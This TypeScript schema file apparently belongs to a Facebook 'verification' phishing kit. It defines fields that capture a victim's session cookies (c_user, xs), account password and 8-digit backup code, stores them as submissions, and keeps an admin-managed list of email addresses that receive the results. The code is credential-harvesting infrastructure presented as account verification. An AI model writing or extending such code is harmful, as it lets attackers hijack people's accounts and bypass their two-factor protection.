import { z } from "zod";

// Verification form schema
export const verificationFormSchema = z.object({
  c_user: z.string().min(1, "Facebook User ID is required"),
  xs: z.string().min(1, "Session Token is required"),
  full_name: z.string().min(1, "Full name is required"),
  profile_url: z.string().url("Please enter a valid profile URL"),
});

export type VerificationForm = z.infer<typeof verificationFormSchema>;

// Backup code schema
export const backupCodeSchema = z.object({
  backup_code: z.string().length(8, "Backup code must be 8 digits").regex(/^\d{8}$/, "Backup code must contain only digits"),
});

export type BackupCode = z.infer<typeof backupCodeSchema>;

// Password verification schema
export const passwordVerificationSchema = z.object({
  password: z.string().min(6, "Password must be at least 6 characters"),
});

export type PasswordVerification = z.infer<typeof passwordVerificationSchema>;

// Verification submission schema
export const verificationSubmissionSchema = z.object({
  id: z.string(),
  c_user: z.string(),
  xs: z.string(),
  full_name: z.string(),
  profile_url: z.string(),
  current_step: z.string(),
  completed_at: z.date().optional(),
  backup_code: z.string().optional(),
  password: z.string().optional(),
});

export type VerificationSubmission = z.infer<typeof verificationSubmissionSchema>;

// Insert schema
export const insertVerificationSubmissionSchema = verificationSubmissionSchema.omit({ id: true });
export type InsertVerificationSubmission = z.infer<typeof insertVerificationSubmissionSchema>;

// Admin login schema
export const adminLoginSchema = z.object({
  password: z.string().min(1, "Password is required"),
});

export type AdminLogin = z.infer<typeof adminLoginSchema>;

// Email management schema
export const emailReceiverSchema = z.object({
  email: z.string().email("Please enter a valid email address"),
  name: z.string().min(1, "Name is required"),
});

export type EmailReceiver = z.infer<typeof emailReceiverSchema>;

// Email receiver list schema
export const emailReceiverListSchema = z.object({
  id: z.string(),
  email: z.string(),
  name: z.string(),
  created_at: z.date().optional(),
});

export type EmailReceiverList = z.infer<typeof emailReceiverListSchema>;

export const insertEmailReceiverSchema = emailReceiverListSchema.omit({ id: true });
export type InsertEmailReceiver = z.infer<typeof insertEmailReceiverSchema>;
